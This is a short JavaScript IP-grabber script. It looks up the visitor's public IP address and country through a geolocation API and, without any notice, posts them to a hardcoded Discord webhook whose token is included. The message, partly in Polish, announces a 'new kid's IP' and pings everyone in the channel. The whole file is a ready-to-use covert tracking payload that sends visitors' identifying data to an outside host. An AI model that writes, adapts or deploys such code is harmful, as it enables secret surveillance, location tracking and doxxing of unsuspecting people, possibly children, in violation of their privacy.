var webHookUrl = 'https://discord.com/api/webhooks/1211112923829633085/Zz9xbJWzD4irh-UAsLeybNKVAHtACaYFCUOaQqdDkZ9Dg6cdw9a5MJHjj7RgcRgjCOEb'
$.getJSON('https://api.db-ip.com/v2/free/self', function(data) {

  console.log(JSON.stringify(data, null, 2));

});

const request = async () => { // Calling a "synchronous" fetch

    const response = await fetch('https://api.db-ip.com/v2/free/self');

    const data = await response.json();

    console.log(data);

    // Declaring variables

    var ip = data.ipAddress;

    var country = data.countryName;

    // Open POST Request

    var postRequest = new XMLHttpRequest();

    postRequest.open("POST", webHookUrl);

    postRequest.setRequestHeader('Content-type', 'application/json');

    var params = {

        username:   "IP Log",

        avatar_url: "",

        content:    "**nowe ip kida** @everyone \n" + 

		    "__**:globe_with_meridians: IP Address:**__ \n" +                    "`" + ip + "` \n" +

		    "__**Kraj:**__ \n" +

		    "`" + country + "`"

    }

    postRequest.send(JSON.stringify(params));

}

request();
